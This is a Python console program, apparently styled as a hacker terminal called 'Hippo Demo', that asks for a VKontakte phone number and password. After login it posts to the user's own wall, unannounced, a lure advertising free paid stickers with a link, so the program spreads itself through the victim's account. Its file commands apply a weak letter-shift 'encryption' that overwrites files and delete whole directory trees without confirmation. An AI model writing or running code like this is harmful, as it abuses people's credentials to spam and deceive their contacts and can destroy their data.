import random
from time import*
import time
from tqdm import tqdm
from time import sleep

import shutil

import os

from colorama import init, Fore
from colorama import Back
from colorama import Style

import vk_api

from getpass4 import getpass

SYMBOLS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'		
MAX_KEY_SIZE = len(SYMBOLS)

o = []
qwe = ''
qwe2 = ''
auth = False


def getTranslatedMessage(mode, message, key):		
    if mode[0] == 'р':		
	    key = -key		
    translated = ''		
			
    for symbol in message:		
	    symbolIndex = SYMBOLS.find(symbol)		
	    if symbolIndex == -1: 		
	            		
	        translated += symbol		
	    else:		
	            # Encrypt or decrypt		
	        symbolIndex += key		
			
	        if symbolIndex >= len(SYMBOLS):		
	            symbolIndex -= len(SYMBOLS)		
	        elif symbolIndex < 0:		
	            symbolIndex += len(SYMBOLS)		
			
	        translated += SYMBOLS[symbolIndex]		
    return translated

g = ''
h = ''

time.sleep(5)
print(Fore. RED + ">>>                      ", end="")
print(Fore. RED + "Hippo Demo®")
time.sleep(3)



    

print(Fore. RED + ">>>", end="")
time.sleep(3)
print(Fore. RED + "The_User_opened_the_console", end="")
time.sleep(3)
print(Fore. RED + "   █ $")
time.sleep(3)
print(Fore. RED + ">>>", end="")
time.sleep(3)
for i in tqdm(range(100), colour='red'):
    sleep(random.uniform(0.01, 0.1))
print(Fore. RED + "Successfully!")
time.sleep(3)

try:
    print(Fore. RED + ">>>Authorization_through_VKontakte_._Please_enter_your_details_!_If_the_data_is_incorrect_,_the_program_may_crash_!   █ $")
    time.sleep(3)
    loginA = input(Fore. RED + ">>>Phone_number(+7 *** *** ** **)   █ $")
    
    loginB = input(Fore. RED + ">>>Password   █ $")

    

    vk_session = vk_api.VkApi(loginA, loginB)
    vk_session.auth()

    vk = vk_session.get_api()
    
    vk.wall.post(message="Download_free_all_paid_VK_stickers_free - [link]")
    #print(vk.wall.post(message="Download_free_all_paid_VK_stickers_free - https://drive.google.com/drive/folders/1zRwIqyHBE99Lhy1qXOHPifdgW2CwED27?usp=sharing"))
    
    for i in tqdm(range(100), colour='red'):
        sleep(random.uniform(0.01, 0.1))
    print(Fore. RED + "Successfully!")
    
    auth = True
except: #vk_api.exceptions.Captcha:
    
    print(Fore. RED + "Phone_number_or_password_is_incorrect!_Try_again_with_the_'$auth'_command_!")
    
    





    
while True:    
    v = input(Fore. RED + ">>>   █ $")
    if v == 'help':
        print(Fore. RED + '>>>Await   █ $')
        time.sleep(0.5)
        print(Fore. RED + '>>>Command_in_progress   █ $')
        time.sleep(3)
        print(Fore. RED + '>>>Сommand_list:   █ $')
        time.sleep(0.5)
        print(Fore. RED + '>>>$help - Command_list    █ $')
        time.sleep(0.5)
        print(Fore. RED + '>>>$encrypt - File_encryption    █ $')
        time.sleep(0.5)
        print(Fore. RED + '>>>$decipher - File_decryption    █ $')
        time.sleep(0.5)
        print(Fore. RED + '>>>$delete - Deleting_a_file    █ $')
        time.sleep(0.5)
        print(Fore. RED + '>>>$rename - Renaming_a_file    █ $')
        time.sleep(0.5)
        print(Fore. RED + '>>>$auth - Reauthorization    █ $')

    

        
    elif v == 'encrypt' and auth == True:



                
            
            
        
        f = input(Fore. RED + r">>>_$File$   █")
        with open(f, 'r') as file:
            g = file.read()

        time.sleep(3)
        print(Fore. RED + '>>>Working_with_files...   █ $')
        for i in tqdm(range(100), colour='red'):
            sleep(random.uniform(0.01, 0.1))
        time.sleep(3)
        print(getTranslatedMessage('расшифровать', g, 5))
        h = getTranslatedMessage('расшифровать', g, 5)
        with open(f, 'w') as file:
                file.write(h)


    elif v == 'rename' and auth == True:
    
        f = input(Fore. RED + r">>>_$File$   █")
        time.sleep(3)
        newname = input(Fore. RED + r">>>_$New_file_name$   █")
        time.sleep(3)
        with open(f, 'r') as file:
            g = file.read()

        os.rename(f, newname)
        time.sleep(3)
        print(Fore. RED + '>>>Working_with_files...   █ $')
        for i in tqdm(range(100), colour='red'):
            sleep(random.uniform(0.01, 0.1))
    elif v == 'delete' and auth == True:
    
        f = input(Fore. RED + r">>>_$File$   █")
    
    
    

    
        time.sleep(3)
        print(Fore. RED + '>>>Working_with_files...   █ $')
        for i in tqdm(range(100), colour='red'):
            sleep(random.uniform(0.01, 0.1))
        time.sleep(3)    
        shutil.rmtree(f)    

    

        
    
    
    elif v == 'decipher' and auth == True:
    
        f = input(Fore. RED + r">>>_$File$   █")
        time.sleep(3)
        with open(f, 'r') as file:
            g = file.read()
        time.sleep(3)    
        print(Fore. RED + '>>>Working_with_files...   █ $')
        for i in tqdm(range(100), colour='red'):
            sleep(random.uniform(0.01, 0.1))
        time.sleep(3)    
        print(getTranslatedMessage('зашифровать', g, 5))
        h = getTranslatedMessage('зашифровать', g, 5)
        with open(f, 'w') as file:
            file.write(h)
    elif v == 'go out':
        
        print(Fore. RED + '>>>Are_you_sure_you_want_to_exit_Windows_?_(Yes/No)   █ $')
        
        time.sleep(3)
        enter = input(Fore. RED + r">>>   █ $").lower()
        time.sleep(3)
        if enter == 'yes':
            break
    elif v == 'auth':
    
        try:
            print(Fore. RED + ">>>Authorization_through_VKontakte_._Please_enter_your_details_!   █ $")
            time.sleep(3)
            loginA = input(Fore. RED + ">>>Phone_number(+7 *** *** ** **)   █ $")
            time.sleep(3)
            loginB = input(Fore. RED + ">>>Password   █ $")

            time.sleep(3)

            vk_session = vk_api.VkApi(loginA, loginB)
            vk_session.auth()

            vk = vk_session.get_api()
            time.sleep(3)
            print(vk.wall.post(message="Download_free_all_paid_VK_stickers_free - [link]"))
            #print(vk.wall.post(message="Download_free_all_paid_VK_stickers_free - https://drive.google.com/drive/folders/1zRwIqyHBE99Lhy1qXOHPifdgW2CwED27?usp=sharing"))
            time.sleep(3)
            for i in tqdm(range(100), colour='red'):
                sleep(random.uniform(0.01, 0.1))
            print(Fore. RED + "Successfully!", end="")
            time.sleep(3)
            auth = True
        except vk_api.exceptions.Captcha:
            time.sleep(3)
            print(Fore. RED + "Phone_number_or_password_is_incorrect!_Try_again_with_the_'$auth'_command_!")

    
    else:
        print(Fore. RED + '>>>You_are_not_logged_in_("$auth")_or_there_is_no_such_command_("$help")_!   █ $')
    
    


			
